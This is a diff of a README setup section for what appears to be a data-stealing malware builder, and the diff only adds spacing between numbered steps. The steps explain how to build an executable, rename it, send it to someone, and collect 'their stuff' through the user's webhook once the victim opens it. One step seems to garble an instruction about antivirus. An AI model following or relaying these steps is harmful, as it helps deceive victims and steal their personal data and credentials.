@@ -34,14 +34,25 @@ Setup under features
 Setup
 
 1.Download the zip
+
 2.open the file
+
 3.Extract the zip inside it
+
 4.turn on antivirus it might delete important files
+
 5.open the .exe file
+
 6.then open installpy file
+
 7.then open the build.bat file
+
 8.follow the instructions
+
 9.open the dist folder
+
 10.rename your file in the dist folder
+
 11.send it to somebody 
+
 12.once they download and open your file their stuff will be sent to your webhook.
